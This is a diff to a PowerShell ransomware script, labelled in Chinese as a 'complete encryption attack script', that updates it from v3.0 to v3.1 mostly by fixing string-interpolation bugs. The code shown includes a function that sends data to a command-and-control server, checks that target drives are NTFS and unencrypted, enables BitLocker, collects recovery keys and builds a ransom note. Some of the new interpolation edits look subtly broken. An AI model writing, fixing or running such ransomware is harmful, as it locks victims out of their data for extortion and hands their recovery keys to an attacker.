@@ -4,12 +4,13 @@ BitLocker Agent v3.0 - 完整的加密攻击脚本
 .DESCRIPTION
 真正的BitLocker加密工具，包含完整的C2通信、加密、恢复密钥管理等
 .NOTES
-版本: 3.0
+版本: 3.1
 发布日期: 2026-04-09
+修复: 修复字符串插值中的驱动器引用问题
 #>
 
 # ============================================
-# BitLocker Agent v3.0 - 完整加密版本
+# BitLocker Agent v3.1 - 修复版
 # ============================================
 
 param(
@@ -81,7 +82,11 @@ function Write-Log {
             "SUCCESS" = "Green"
         }
         
-        Write-Host $logEntry -ForegroundColor $colors[$Level]
+        if ($Level -eq "SUCCESS") {
+            Write-Host $logEntry -ForegroundColor Green
+        } else {
+            Write-Host $logEntry -ForegroundColor $colors[$Level]
+        }
     }
 }
 
@@ -100,7 +105,7 @@ function Send-ToC2 {
     $jsonPayload = $Data | ConvertTo-Json -Depth 10
     $uri = "http://$($Global:AttackConfig.C2Server):$($Global:AttackConfig.C2Port)$($Global:AttackConfig.ApiEndpoint)"
     
-    Write-Log "发送$Stage数据到: $uri" -Level INFO -Console
+    Write-Log "发送 $Stage 数据到: $uri" -Level INFO -Console
     
     $maxRetries = 3
     for ($retry = 0; $retry -lt $maxRetries; $retry++) {
@@ -108,7 +113,7 @@ function Send-ToC2 {
             Write-Log "尝试 $($retry + 1)/$maxRetries..." -Level DEBUG
             
             $response = Invoke-RestMethod -Uri $uri -Method Post -Body $jsonPayload -ContentType "application/json" -TimeoutSec 30
-            Write-Log "$Stage数据发送成功" -Level SUCCESS -Console
+            Write-Log "$Stage 数据发送成功" -Level SUCCESS -Console
             return $true
             
         } catch [System.Net.WebException] {
@@ -249,7 +254,7 @@ function Test-EncryptionRequirements {
     param([ref]$SystemInfoRef)
     
     Write-Log "检查加密要求..." -Level INFO -Console
-    Write-Log "=" * 40 -Level INFO
+    Write-Log "========================================" -Level INFO
     
     $requirements = @{
         IsAdmin = $false
@@ -308,15 +313,16 @@ function Test-EncryptionRequirements {
     $allDrivesNTFS = $true
     foreach ($drive in $Global:AttackConfig.TargetDrives) {
         try {
-            $driveInfo = Get-Volume -DriveLetter $drive.Substring(0,1) -ErrorAction Stop
+            $driveLetter = $drive.Replace(":", "")  # 移除冒号
+            $driveInfo = Get-Volume -DriveLetter $driveLetter -ErrorAction Stop
             if ($driveInfo.FileSystem -eq "NTFS") {
-                Write-Log "  ✓ $drive: NTFS格式" -Level SUCCESS
+                Write-Log "  ✓ ${drive} NTFS格式" -Level SUCCESS
             } else {
-                Write-Log "  ✗ $drive: 非NTFS格式 ($($driveInfo.FileSystem))" -Level ERROR
+                Write-Log "  ✗ ${drive} 非NTFS格式 ($($driveInfo.FileSystem))" -Level ERROR
                 $allDrivesNTFS = $false
             }
         } catch {
-            Write-Log "  ✗ 无法检查$drive格式: $_" -Level ERROR
+            Write-Log "  ✗ 无法检查 ${drive} 格式: $_" -Level ERROR
             $allDrivesNTFS = $false
         }
     }
@@ -339,13 +345,13 @@ function Test-EncryptionRequirements {
         try {
             $volume = Get-BitLockerVolume -MountPoint $drive -ErrorAction SilentlyContinue
             if ($volume -and $volume.ProtectionStatus -eq "On") {
-                Write-Log "  ✗ $drive: 已加密" -Level ERROR
+                Write-Log "  ✗ ${drive} 已加密" -Level ERROR
                 $allDrivesNotEncrypted = $false
             } else {
-                Write-Log "  ✓ $drive: 未加密" -Level SUCCESS
+                Write-Log "  ✓ ${drive} 未加密" -Level SUCCESS
             }
         } catch {
-            Write-Log "  ⚠ 无法检查$drive加密状态" -Level WARNING
+            Write-Log "  ⚠ 无法检查 ${drive} 加密状态" -Level WARNING
         }
     }
     $requirements.DriveNotEncrypted = $allDrivesNotEncrypted
@@ -360,7 +366,7 @@ function Test-EncryptionRequirements {
         $requirements.DriveNotEncrypted
     )
     
-    Write-Log "=" * 40 -Level INFO
+    Write-Log "========================================" -Level INFO
     if ($requirements.AllRequirementsMet) {
         Write-Log "所有要求检查通过，可以开始加密" -Level SUCCESS -Console
     } else {
@@ -481,7 +487,7 @@ function Enable-BitLockerEncryption {
         $volume = Get-BitLockerVolume -MountPoint $DriveLetter -ErrorAction Stop
         
         if ($volume.ProtectionStatus -eq "On") {
-            Write-Log "驱动器 $DriveLetter 已加密" -Level WARNING
+            Write-Log "驱动器 ${DriveLetter} 已加密" -Level WARNING
             
             # 尝试获取现有恢复密钥
             $existingKeys = $volume.KeyProtector | Where-Object { 
@@ -671,7 +677,7 @@ function Create-RansomNote {
     
     $keySections = ""
     foreach ($keyInfo in $RecoveryKeys) {
-        $keySections += "`n驱动器 $($keyInfo.MountPoint):"
+        $keySections += "`n驱动器 ${$keyInfo.MountPoint}:"
         $keySections += "`n$($keyInfo.RecoveryKey)`n"
     }
     
@@ -743,11 +749,11 @@ function Start-BitLockerAttack {
     $bitlockerInfo = @()
     
     foreach ($drive in $Global:AttackConfig.TargetDrives) {
-        Write-Log "`n处理驱动器: $drive" -Level INFO -Console
+        Write-Log "`n处理驱动器: ${drive}" -Level INFO -Console
         
         # 1. 检查驱动器是否存在
         if (-not (Test-Path $drive)) {
-            Write-Log "驱动器不存在: $drive" -Level ERROR
+            Write-Log "驱动器不存在: ${drive}" -Level ERROR
             $attackResults += @{
                 Drive = $drive
                 Action = "CheckDrive"
@@ -846,7 +852,8 @@ function Main {
     # 显示横幅
     Clear-Host
     Write-Host "╔══════════════════════════════════════════════════════╗" -ForegroundColor DarkRed
-    Write-Host "║   BitLocker Agent v3.0 - Complete Encryption       ║" -ForegroundColor DarkRed
+    Write-Host "║   BitLocker Agent v3.1 - Complete Encryption       ║" -ForegroundColor DarkRed
+    Write-Host "║               (修复字符串插值问题)                  ║" -ForegroundColor DarkRed
     Write-Host "╚══════════════════════════════════════════════════════╝" -ForegroundColor DarkRed
     Write-Host ""
     
@@ -921,7 +928,7 @@ function Main {
     if ($systemInfo.RecoveryKeys.Count -gt 0) {
         Write-Host "`n恢复密钥:" -ForegroundColor Yellow
         foreach ($key in $systemInfo.RecoveryKeys) {
-            Write-Host "  $($key.MountPoint): " -NoNewline
+            Write-Host "  ${$key.MountPoint}: " -NoNewline
             Write-Host "$($key.RecoveryKey)" -ForegroundColor Magenta
         }
     }
